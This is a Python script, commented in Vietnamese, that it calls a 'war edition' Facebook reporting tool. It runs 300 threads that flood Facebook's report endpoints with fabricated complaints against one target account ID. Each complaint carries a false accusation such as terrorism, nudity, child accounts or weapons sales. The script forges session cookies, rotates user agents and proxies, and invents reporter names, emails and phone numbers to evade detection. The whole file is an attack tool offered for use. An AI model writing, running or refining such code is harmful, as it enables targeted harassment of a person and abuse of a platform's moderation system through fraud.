# ============================================
# file dự án 5/4/2025 dame acc bất chấp đến 2028
# MÃ HÓA: UTF-8
# MÔ TẢ: Công cụ báo cáo Facebook cường độ cao - phiên bản tối đa hóa sát thương
# YÊU CẦU: Python 3, Termux, RAM >= 2GB, KẾT NỐI MẠNH
# ============================================

import requests
import random
import threading
import time
import sys
import os
import json
import string
from concurrent.futures import ThreadPoolExecutor, as_completed
from urllib.parse import urlencode

CO_THE_TAO_UA = False
ua = None
try:
    from fake_useragent import UserAgent
    ua = UserAgent()
    CO_THE_TAO_UA = True
except ImportError:
    print("[!] fake-useragent chưa cài. Dùng danh sách tĩnh.")

ID_TAI_KHOAN_MUC_TIEU = ""

SO_LUONG = 300

DO_TRE = 0.3

SO_VONG_MOI_PHIEN = 15

CAC_LOAI_BAO_CAO = [
    "fake_account",
    "impersonation",
    "impersonation_celebrity",
    "impersonation_friend",
    "harassment",
    "harassment_bullying",
    "inappropriate_content",
    "spam",
    "scam",
    "violence",
    "violence_threats",
    "hate_speech",
    "hate_speech_race",
    "nudity",
    "sexual_content",
    "intellectual_property",
    "underage_account",
    "terrorism",
    "suicide_self_harm",
    "drugs",
    "weapons",
    "fraud",
    "phishing",
    "malware",
    "stolen_account",
]

CAC_DIEM_CUOI_BAO_CAO = [
    "https://www.facebook.com/help/contact/",
    "https://www.facebook.com/report/",
    "https://mbasic.facebook.com/report.php",
    "https://m.facebook.com/help/contact/",
    "https://web.facebook.com/help/contact/",
    "https://www.facebook.com/help/contact/309541064396908",
    "https://www.facebook.com/help/contact/274459462613911",
    "https://www.facebook.com/help/contact/174279849415266",
    "https://www.facebook.com/help/contact/567360146682371",
]

DANH_SACH_PROXY = []

FILE_UA = "user_agents.txt"

danh_sach_ua = []
if os.path.exists(FILE_UA):
    with open(FILE_UA, "r", encoding="utf-8") as f:
        danh_sach_ua = [dong.strip() for dong in f if dong.strip()]
    print(f"[+] Đã tải {len(danh_sach_ua)} User-Agent.")
else:
    print("[!] Dùng danh sách UA mặc định (50 mẫu).")
    danh_sach_ua = [
        "Mozilla/5.0 (Linux; Android 13; SM-G998B) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Mobile Safari/537.36",
        "Mozilla/5.0 (Linux; Android 14; Pixel 8 Pro) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/121.0.0.0 Mobile Safari/537.36",
        "Mozilla/5.0 (Linux; Android 13; SM-S908B) AppleWebKit/537.36 (KHTML, like Gecko) SamsungBrowser/23.0 Chrome/115.0.0.0 Mobile Safari/537.36",
        "Mozilla/5.0 (Linux; Android 12; Redmi Note 11) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/119.0.0.0 Mobile Safari/537.36",
        "Mozilla/5.0 (Linux; Android 13; OPPO Find X5 Pro) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/118.0.0.0 Mobile Safari/537.36",
        "Mozilla/5.0 (Linux; Android 14; OnePlus 12) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/122.0.0.0 Mobile Safari/537.36",
        "Mozilla/5.0 (Linux; Android 13; Vivo X90 Pro) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/117.0.0.0 Mobile Safari/537.36",
        "Mozilla/5.0 (Linux; Android 12; Huawei P60 Pro) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/116.0.0.0 Mobile Safari/537.36",
        "Mozilla/5.0 (iPhone; CPU iPhone OS 17_3 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.3 Mobile/15E148 Safari/604.1",
        "Mozilla/5.0 (iPhone; CPU iPhone OS 17_2_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.2 Mobile/15E148 Safari/604.1",
        "Mozilla/5.0 (iPhone; CPU iPhone OS 16_7 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/16.6 Mobile/15E148 Safari/604.1",
        "Mozilla/5.0 (iPhone; CPU iPhone OS 15_8 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/15.6.6 Mobile/15E148 Safari/604.1",
        "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/121.0.0.0 Safari/537.36",
        "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36 Edg/120.0.0.0",
        "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:122.0) Gecko/20100101 Firefox/122.0",
        "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/119.0.0.0 Safari/537.36 OPR/105.0.0.0",
        "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.3 Safari/605.1.15",
        "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/121.0.0.0 Safari/537.36",
        "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/121.0.0.0 Safari/537.36",
        "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:122.0) Gecko/20100101 Firefox/122.0",
        "Mozilla/5.0 (Linux; Android 13; SM-A536B) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Mobile Safari/537.36",
        "Mozilla/5.0 (Linux; Android 14; SM-F946B) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/121.0.0.0 Mobile Safari/537.36",
        "Mozilla/5.0 (iPhone; CPU iPhone OS 17_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) CriOS/120.0.6099.119 Mobile/15E148 Safari/604.1",
        "Mozilla/5.0 (iPad; CPU OS 17_3 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.3 Mobile/15E148 Safari/604.1",
        "Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",
        "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_14_6) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/119.0.0.0 Safari/537.36",
        "Mozilla/5.0 (X11; Linux x86_64; rv:115.0) Gecko/20100101 Firefox/115.0",
        "Mozilla/5.0 (Linux; Android 13; CPH2449) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/118.0.0.0 Mobile Safari/537.36",
        "Mozilla/5.0 (iPhone; CPU iPhone OS 16_5 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) FxiOS/122.0 Mobile/15E148 Safari/605.1.15",
        "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/109.0.0.0 Safari/537.36",
    ]

def lay_ua_ngau_nhien():
    if CO_THE_TAO_UA:
        try:
            return ua.random
        except:
            pass
    return random.choice(danh_sach_ua) if danh_sach_ua else "Mozilla/5.0"

def tao_hex_ngau_nhien(do_dai):
    return ''.join(random.choice('abcdef0123456789') for _ in range(do_dai))

def tao_chuoi_ngau_nhien(do_dai=10):
    return ''.join(random.choice(string.ascii_letters) for _ in range(do_dai))

def tao_email_ngau_nhien():
    ten = tao_chuoi_ngau_nhien(8).lower()
    mien = random.choice(["gmail.com", "yahoo.com", "outlook.com", "mail.ru", "proton.me"])
    return f"{ten}{random.randint(100,9999)}@{mien}"

def tao_so_dien_thoai_ngau_nhien():
    ma_vung = random.choice(["+84", "+1", "+44", "+7", "+86", "+91"])
    so = ''.join(random.choice('0123456789') for _ in range(9))
    return f"{ma_vung}{so}"

def tao_ten_ngau_nhien():
    ho = random.choice(["Nguyen", "Tran", "Le", "Pham", "Hoang", "John", "Smith", "Kim", "Park", "Wang"])
    ten = random.choice(["Anh", "Binh", "Cuong", "Dung", "Em", "Alice", "Bob", "Charlie", "Min", "Jun"])
    return f"{ho} {ten}"

def tao_phien_sieu_manh():
    phien = requests.Session()
    phien.headers.update({
        "User-Agent": lay_ua_ngau_nhien(),
        "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7",
        "Accept-Language": random.choice(["vi-VN,vi;q=0.9,en-US;q=0.8,en;q=0.7", "en-US,en;q=0.9,vi;q=0.8", "ru-RU,ru;q=0.9,en;q=0.8"]),
        "Accept-Encoding": "gzip, deflate, br",
        "Connection": "keep-alive",
        "Upgrade-Insecure-Requests": "1",
        "Sec-Fetch-Dest": "document",
        "Sec-Fetch-Mode": "navigate",
        "Sec-Fetch-Site": "none",
        "Sec-Fetch-User": "?1",
        "Cache-Control": "max-age=0",
        "DNT": "1",
        "sec-ch-ua": '"Not_A Brand";v="8", "Chromium";v="120", "Google Chrome";v="120"',
        "sec-ch-ua-mobile": "?0",
        "sec-ch-ua-platform": '"Windows"',
    })
    phien.cookies.set("datr", tao_hex_ngau_nhien(24))
    phien.cookies.set("sb", tao_hex_ngau_nhien(24))
    phien.cookies.set("c_user", str(random.randint(100000000, 999999999)))
    phien.cookies.set("xs", f"{random.randint(1,999)}:{tao_hex_ngau_nhien(20)}:{random.randint(1000000000,9999999999)}")
    phien.cookies.set("fr", f"{random.random():.12f}.{tao_hex_ngau_nhien(20)}.{random.randint(1000000000,9999999999)}")
    phien.cookies.set("wd", f"{random.randint(800,1920)}x{random.randint(600,1080)}")
    phien.cookies.set("locale", random.choice(["vi_VN", "en_US", "ru_RU"]))
    phien.cookies.set("presence", f"EDvF3EtimeF{int(time.time())}EuserFA{random.randint(1,9)}B")
    return phien

def gui_bao_cao_da_dang(id_tai_khoan, loai_bao_cao, phien, diem_cuoi, chi_tiet_them=""):
    tham_so = {
        "report_type": loai_bao_cao,
        "reported_user_id": id_tai_khoan,
        "source": random.choice(["profile", "timeline", "photo", "message", "group"]),
        "action": "submit",
        "ref": random.choice(["report", "help", "settings", "timeline"]),
        "hc_location": "ufi",
        "render_verification": "true",
    }
    cac_ly_do = [
        f"Tài khoản này là giả mạo và đang lừa đảo người dùng. ID báo cáo: {random.randint(1000000,9999999)}",
        f"Người này đang mạo danh {tao_ten_ngau_nhien()}. Tôi là nạn nhân thực sự.",
        f"Tài khoản quấy rối tôi liên tục qua tin nhắn. Đây là vi phạm nghiêm trọng.",
        f"Spam liên kết độc hại đến {random.randint(10,99)} người trong nhóm.",
        f"Nội dung đồi trụy, khỏa thân vi phạm tiêu chuẩn cộng đồng.",
        f"Đe dọa bạo lực, khủng bố. Cần xử lý khẩn cấp.",
        f"Phân biệt chủng tộc, ngôn từ thù địch nhắm vào cộng đồng.",
        f"Tài khoản trẻ em dưới 13 tuổi vi phạm điều khoản.",
        f"Bán vũ khí, ma túy trái phép trên nền tảng.",
        f"Lừa đảo chiếm đoạt tài khoản qua link phishing.",
    ]
    du_lieu = {
        "report_category": loai_bao_cao,
        "reported_uid": id_tai_khoan,
        "reason": random.choice(cac_ly_do),
        "details": f"{random.choice(cac_ly_do)} {chi_tiet_them} Mã tham chiếu: FB-{random.randint(100000,999999)}-{tao_chuoi_ngau_nhien(5).upper()}",
        "submit": random.choice(["Gửi", "Send", "Submit", "Báo cáo", "Report"]),
        "email": tao_email_ngau_nhien(),
        "phone": tao_so_dien_thoai_ngau_nhien(),
        "full_name": tao_ten_ngau_nhien(),
        "relationship": random.choice(["friend", "stranger", "family", "coworker"]),
        "know_this_person": random.choice(["yes", "no"]),
        "severity": random.choice(["high", "critical", "medium"]),
        "urgency": "true",
        "multiple_reports": "true",
    }
    du_lieu[f"field_{random.randint(1,99)}"] = tao_chuoi_ngau_nhien(random.randint(5,15))
    try:
        proxy = None
        if DANH_SACH_PROXY:
            proxy_str = random.choice(DANH_SACH_PROXY)
            proxy = {"http": f"http://{proxy_str}", "https": f"http://{proxy_str}"}
        phien.get(diem_cuoi, params=tham_so, proxies=proxy, timeout=10, allow_redirects=True)
        time.sleep(0.1)
        phan_hoi = phien.post(
            diem_cuoi,
            params=tham_so,
            data=du_lieu,
            proxies=proxy,
            timeout=15,
            allow_redirects=True,
            headers={
                "Referer": f"https://www.facebook.com/{id_tai_khoan}",
                "Origin": "https://www.facebook.com",
                "Content-Type": "application/x-www-form-urlencoded",
            }
        )
        return phan_hoi.status_code
    except requests.exceptions.RequestException:
        return -1

def linh_chien_dau(id_tai_khoan, id_linh):
    phien = tao_phien_sieu_manh()
    so_lan_loi = 0
    tong_thanh_cong = 0
    while True:
        so_loai = random.randint(3, 5)
        cac_loai_chon = random.sample(CAC_LOAI_BAO_CAO, min(so_loai, len(CAC_LOAI_BAO_CAO)))
        diem_cuoi = random.choice(CAC_DIEM_CUOI_BAO_CAO)
        for loai in cac_loai_chon:
            trang_thai = gui_bao_cao_da_dang(
                id_tai_khoan, 
                loai, 
                phien, 
                diem_cuoi,
                f"[Lính-{id_linh}] Đợt tấn công #{tong_thanh_cong + 1}"
            )
            if trang_thai == 200 or trang_thai == 302:
                tong_thanh_cong += 1
                so_lan_loi = 0
                if tong_thanh_cong % 10 == 0:
                    print(f"[🔥] Lính-{id_linh} | {tong_thanh_cong} báo cáo | LOẠI: {loai} | ĐANG HỦY DIỆT...")
            else:
                so_lan_loi += 1
                if so_lan_loi > 10:
                    print(f"[🔄] Lính-{id_linh} | LÀM MỚI PHIÊN | {so_lan_loi} lỗi liên tiếp")
                    phien = tao_phien_sieu_manh()
                    so_lan_loi = 0
            time.sleep(random.uniform(0.05, DO_TRE))
        time.sleep(random.uniform(0.1, 0.5))

def tan_cong_tong_luc(id_tai_khoan):
    print("\n" + "=" * 60)
    print("  ⚔️  HUY ĐỘNG TOÀN BỘ LỰC LƯỢNG TẤN CÔNG ⚔️")
    print("=" * 60)
    print(f"  🎯 MỤC TIÊU: {id_tai_khoan}")
    print(f"  👥 QUÂN SỐ: {SO_LUONG} LÍNH")
    print(f"  🗂️  LOẠI VŨ KHÍ: {len(CAC_LOAI_BAO_CAO)}")
    print(f"  🌐 ĐIỂM TẤN CÔNG: {len(CAC_DIEM_CUOI_BAO_CAO)}")
    print(f"  ⚡ TỐC ĐỘ: {DO_TRE} GIÂY/LẦN")
    print(f"  🔒 PROXY: {len(DANH_SACH_PROXY)}")
    print("=" * 60)
    print("  [⚠️] CUỘC TẤN CÔNG BẮT ĐẦU SAU 2 GIÂY...")
    print("  [⚠️] NHẤN Ctrl+C ĐỂ RÚT QUÂN\n")
    time.sleep(2)
    cac_linh = []
    for i in range(SO_LUONG):
        linh = threading.Thread(
            target=linh_chien_dau,
            args=(id_tai_khoan, i+1),
            daemon=True,
            name=f"Linh-{i+1}"
        )
        linh.start()
        cac_linh.append(linh)
        if i % 50 == 0:
            print(f"[+] Đã triển khai {i+1}/{SO_LUONG} lính...")
        time.sleep(0.01)
    print(f"\n[✅] TOÀN BỘ {SO_LUONG} LÍNH ĐÃ VÀO VỊ TRÍ CHIẾN ĐẤU!")
    print("[⚔️] ĐANG TẤN CÔNG... THEO DÕI CHIẾN TRƯỜNG:\n")
    try:
        while True:
            time.sleep(1)
    except KeyboardInterrupt:
        print("\n[🏳️] RÚT QUÂN! CUỘC TẤN CÔNG KẾT THÚC.")

if __name__ == "__main__":
    print("=" * 60)
    print("  🔥 CÔNG CỤ BÁO CÁO FACEBOOK - PHIÊN BẢN CHIẾN TRANH 🔥")
    print("  ⚡ TỐC ĐỘ CAO - ĐA LUỒNG - KHÓ BỊ CHẶN ⚡")
    print("=" * 60)
    if not ID_TAI_KHOAN_MUC_TIEU:
        ID_TAI_KHOAN_MUC_TIEU = input("[?] NHẬP ID FACEBOOK MỤC TIÊU: ").strip()
    if not ID_TAI_KHOAN_MUC_TIEU:
        print("[❌] KHÔNG CÓ MỤC TIÊU! THOÁT.")
        sys.exit(1)
    if not ID_TAI_KHOAN_MUC_TIEU.replace(".", "").replace("-", "").replace("_", "").isalnum():
        print("[⚠️] ID có vẻ không hợp lệ nhưng vẫn tiếp tục...")
    tan_cong_tong_luc(ID_TAI_KHOAN_MUC_TIEU)